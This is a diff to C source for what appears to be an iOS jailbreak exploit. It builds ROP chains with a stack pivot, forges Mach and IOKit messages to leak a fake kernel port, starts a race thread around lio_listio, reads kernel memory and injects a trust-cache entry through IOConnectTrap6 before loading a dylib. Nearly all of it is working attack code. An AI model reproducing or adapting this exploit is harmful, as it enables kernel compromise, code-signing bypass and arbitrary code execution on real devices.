@@ -16,6 +16,41 @@ typedef struct {
 	char pad[4096]; // FIXME: what a waste
 } ool_message_struct;
 
+#pragma pack(4)
+typedef struct {
+    mach_msg_header_t Head;
+    NDR_record_t NDR;
+    uint32_t selector;
+    mach_msg_type_number_t scalar_inputCnt;
+    /*io_user_scalar_t scalar_input[16];*/
+    mach_msg_type_number_t inband_inputCnt;
+    char inband_input[24];
+    mach_vm_address_t ool_input;
+    mach_vm_size_t ool_input_size;
+    mach_msg_type_number_t inband_outputCnt;
+    mach_msg_type_number_t scalar_outputCnt;
+    mach_vm_address_t ool_output;
+    mach_vm_size_t ool_output_size;
+} MEMLEAK_Request __attribute__((unused));
+typedef struct {
+    mach_msg_header_t Head;
+    NDR_record_t NDR;
+    kern_return_t RetCode;
+    mach_msg_type_number_t inband_outputCnt;
+    char inband_output[24];
+    mach_msg_type_number_t scalar_outputCnt;
+    /*io_user_scalar_t scalar_output[16];*/
+    mach_vm_size_t ool_output_size;
+    mach_msg_trailer_t trailer;
+} MEMLEAK_Reply __attribute__((unused));
+#pragma pack()
+
+union {
+    MEMLEAK_Request In;
+    MEMLEAK_Reply Out;
+} MEMLEAK_msg;
+
+
 typedef volatile struct {
     uint32_t ip_bits;
     uint32_t ip_references;
@@ -69,6 +104,7 @@ typedef volatile struct {
 #define IKOT_IOKIT_CONNECT 29
 #define IKOT_CLOCK 25
 #define NENT 1
+
 
 uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
 	while (ropvars != NULL) {
@@ -148,6 +184,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->comment = NULL;
 						int ropchain_len = 0;
 						int rop_var_tmp_nr = 0;
+						int rop_var_arg_num = -1;
 						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
@@ -187,6 +224,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->comment = NULL;
 						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
+						int rop_var_arg_num = -1;
 						
 						
 						// mmap the file back over the loop
@@ -209,6 +247,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->comment = NULL;
 						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
+						int rop_var_arg_num = -1;
 						
 						/* TLDR on what that monster does:
 						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
@@ -282,10 +321,11 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 }
 uint64_t get_addr_from_name(offset_struct_t * offsets, char * name) {
 	uint64_t sym = dlsym(RTLD_DEFAULT,name);
+	if (sym == 0) {printf("symbol (%s) not found\n",name);exit(1);}
 	uint64_t cache_addr = 0;
 	syscall(294, &cache_addr);
-	sym -= cache_addr;
 	sym += 0x180000000;
+	sym -= cache_addr;
 	return sym;
 }
 char * pos_description_DBG(int pos, int longjmp_buf) {
@@ -407,6 +447,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->comment = NULL;
 						int ropchain_len = 0;
 						int rop_var_tmp_nr = 0;
+						int rop_var_arg_num = -1;
 						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
@@ -446,6 +487,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->comment = NULL;
 						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
+						int rop_var_arg_num = -1;
 						
 						
 						ADD_COMMENT("restore the loop stack");
@@ -468,6 +510,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->comment = NULL;
 						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
+						int rop_var_arg_num = -1;
 
 						/* TLDR on what that monster does:
 						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
@@ -596,6 +639,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ADD_COMMENT(name); \
 	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
 
+#if 0
 	char * buf[1024];
 	snprintf(&buf,sizeof(buf),"testing...");
 	DEFINE_ROP_VAR("test_string",sizeof(buf),&buf);
@@ -604,8 +648,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		ROP_VAR_ARG("test_string",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
 	ADD_LOOP_END();
+#else
 
-#if 0
 	
 	// SETUP VARS
 	char * tmp = malloc(0x1000);
@@ -652,12 +696,30 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		0x00000000,
 		0x00000000,
 	};
-	unsigned int * dict = malloc(sizeof(raw_dict));
 
-	DEFINE_ROP_VAR("dict",sizeof(raw_dict),dict); // dict for the UC
-	SET_ROP_VAR64_TO_VAR_W_OFFSET("dict",2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport
+
+	MEMLEAK_Request * memleak_msg = malloc(sizeof(MEMLEAK_msg));
+	memleak_msg->NDR = NDR_record;
+	memleak_msg->selector = 7;
+	memleak_msg->scalar_inputCnt = 0;
+	memleak_msg->inband_inputCnt = 24; /*sizeof raw_dict*/
+	memcpy(&memleak_msg->inband_input,&raw_dict,24);
+	memleak_msg->ool_input_size = 0;
+	memleak_msg->ool_input = NULL;
+	memleak_msg->inband_outputCnt = 0;
+	memleak_msg->scalar_outputCnt = 0;
+	memleak_msg->ool_output = 0;
+	memleak_msg->ool_output_size = 0;
+	memleak_msg->Head.msgh_bits = MACH_MSG_TYPE_MAKE_SEND_ONCE;
+	memleak_msg->Head.msgh_id = 2865;
+	memleak_msg->Head.msgh_reserved = 0;
+
+
+	DEFINE_ROP_VAR("memleak_msg",sizeof(MEMLEAK_msg),memleak_msg);
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,inband_input) + 2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport
 
 	DEFINE_ROP_VAR("self",sizeof(mach_port_t),&tmp);
+
 
 
 	// setup new trustcache struct
@@ -682,15 +744,36 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf(wedidit_msg,100,"WE DID IT\n");
 	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);
 
-#define BARRIER_BUFFER_SIZE 0x10000
-	// spawn racer thread
-	DEFINE_ROP_VAR("racer_thread",sizeof(pthread_t),tmp);
-	ROP_VAR_ARG("racer_thread",1);
-	CALL("pthread_create",0,offsets->longjmp-0x18095c2e4+offsets->new_cache_addr /*slide it here*/,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
-
-
 	ADD_COMMENT("mach_task_self");
 	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name(offsets,"mach_task_self"),0,0,0,0,0,0,0,0);
+
+#define BARRIER_BUFFER_SIZE 0x10000
+	// spawn racer thread
+	// CALL("pthread_create",0,offsets->longjmp-0x18095c2e4+offsets->new_cache_addr /*slide it here*/,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
+#define _STRUCT_ARM_THREAD_STATE64	struct __darwin_arm_thread_state64
+_STRUCT_ARM_THREAD_STATE64
+{
+	__uint64_t    __x[29];	/* General purpose registers x0-x28 */
+	__uint64_t    __fp;		/* Frame pointer x29 */
+	__uint64_t    __lr;		/* Link register x30 */
+	__uint64_t    __sp;		/* Stack pointer x31 */
+	__uint64_t    __pc;		/* Program counter */
+	__uint32_t    __cpsr;	/* Current program status register */
+};
+	DEFINE_ROP_VAR("racer_kernel_thread",sizeof(thread_act_t),&tmp);
+	_STRUCT_ARM_THREAD_STATE64 * new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
+	new_thread_state->__pc = offsets->longjmp-0x18095c2e4+offsets->new_cache_addr; /*slide it here*/
+	new_thread_state->__pc = 0x41414141;
+	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/;
+	DEFINE_ROP_VAR("thread_state",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state)
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG("thread_state",3);
+	ROP_VAR_ARG("racer_kernel_thread",5);
+	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
+	
+
+
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
@@ -699,10 +782,12 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
 
 		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
+		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG64("self",1);
 		ROP_VAR_ARG("msg_port",3);
 		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
 	
+		ROP_VAR_ARG_HOW_MANY(3);
 		ROP_VAR_ARG64("self",1);
 		ROP_VAR_ARG64("msg_port",2);
 		ROP_VAR_ARG64("msg_port",3);
@@ -710,19 +795,22 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_remote_port) /*offset of head.msgh_remote_port */,"msg_port",0,sizeof(mach_port_t));
 
+		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("ool_msg",1);
 		ROP_VAR_ARG_W_OFFSET("ool_msg",3, offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_size) /*offset of head.msgh_size */);
 		CALL("mach_msg",0,MACH_SEND_MSG,0,0,0,0,0,0);
 
 		// no need for another loop in rop... we can just unroll this one here
+		SET_ROP_VAR64_TO_VAR_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0); // set memleak_msg->Head.msgh_request_port
 		for (int i = 0; i < 10; i++) {
-			ROP_VAR_ARG64("client",1);
-			ROP_VAR_ARG("dict",3);
-			CALL("IOConnectCallStructMethod",0,7,0,sizeof(raw_dict),0,0,0,0);
+			ROP_VAR_ARG_HOW_MANY(1);
+			ROP_VAR_ARG("memleak_msg",1);
+			CALL("mach_msg",0,MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(MEMLEAK_msg),0,0,0,0,0);
 		}
 
 		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_local_port) /*offset of head.msgh_local_port */,"msg_port",0,sizeof(mach_port_t));
 
+		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("ool_msg_recv",1);
 		ROP_VAR_ARG64("msg_port",5);
 		CALL("mach_msg",0,MACH_RCV_MSG,0,sizeof(ool_message_struct),0,0,0,0);
@@ -731,11 +819,13 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		// check if we found a port:
 
 		// copy the descriptor address into it's own var
+		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2, offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of .desc[0].address*/);
 		ROP_VAR_ARG("desc_addr",1);
 		CALL("memcpy",0,0,8,0,0,0,0,0);
 
 		// copy the first 8 bytes at the descriptor address into the_one
+		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("the_one",1);
 		ROP_VAR_ARG64("desc_addr",2);
 		CALL("memcpy",0,0,8,0,0,0,0,0);
@@ -749,6 +839,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	SET_ROP_VAR64("should_race",1); // stop the other thread
 
+	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("WEDIDIT",2);
 	CALL("write",1,0,strlen(wedidit_msg),0,0,0,0,0);
 
@@ -757,11 +848,13 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// get kernel slide
 	// alloc new valid port 
 	DEFINE_ROP_VAR("notification_port",sizeof(mach_port_t),tmp);
+	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG64("self",1);
 	ROP_VAR_ARG("notification_port",3);
 	CALL("_kernelrpc_mach_port_allocate_trap",0,MACH_PORT_RIGHT_RECEIVE,0,0,0,0,0,0);
 
 	// set notification port on our fake port so that we can read back the pointer
+	ROP_VAR_ARG_HOW_MANY(4);
 	ROP_VAR_ARG64("self",1);
 	ROP_VAR_ARG64("the_one",2);
 	ROP_VAR_ARG64("notification_port",5);
@@ -780,11 +873,12 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	SET_ROP_VAR64("out_sz",1);
 #define kr32_raw(addr_var,valuename,offset) \
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,offset); \
+	ROP_VAR_ARG_HOW_MANY(4); \
 	ROP_VAR_ARG64("self",1); \
 	ROP_VAR_ARG64("the_one",2); \
 	ROP_VAR_ARG(valuename,4); \
 	ROP_VAR_ARG("out_sz",5); \
-	CALL("mach_port_get_attributs",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);
+	CALL("mach_port_get_attributes",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);
 #define kr32(addr_var,valuename) kr32_raw(addr_var,valuename,0);
 
 	// setup kr64chr
@@ -813,6 +907,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 	// register the client we have onto our task
+	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG64("self",1);
 	ROP_VAR_ARG("client",2);
 	CALL("mach_ports_register",0,0,1,0,0,0,0,0);
@@ -893,11 +988,13 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_CPY_W_OFFSET("fake_client",0x40,"bss_trust_chain_head_ptr",0,8);
 
 	// fire
+	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG64("the_one",1);
 	ROP_VAR_ARG("new_trust_chain_entry",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 	
 	// dlopen
+	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("dylib_str",1);
 	CALL("dlopen",0,0,0,0,0,0,0,0);
 
@@ -935,6 +1032,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
 	DEFINE_ROP_VAR("racer_fd",sizeof(int),tmp);
+	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("racer_path",1);
 	CALL_FUNC_RET_SAVE_VAR("racer_fd",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);
 
@@ -957,6 +1055,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	//the framework doesn't support inner loops atm, so I hope this works... fingers crossed
 	ADD_LOOP_START("racer_loop");
+		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("aio_list",2);
 		CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
 		
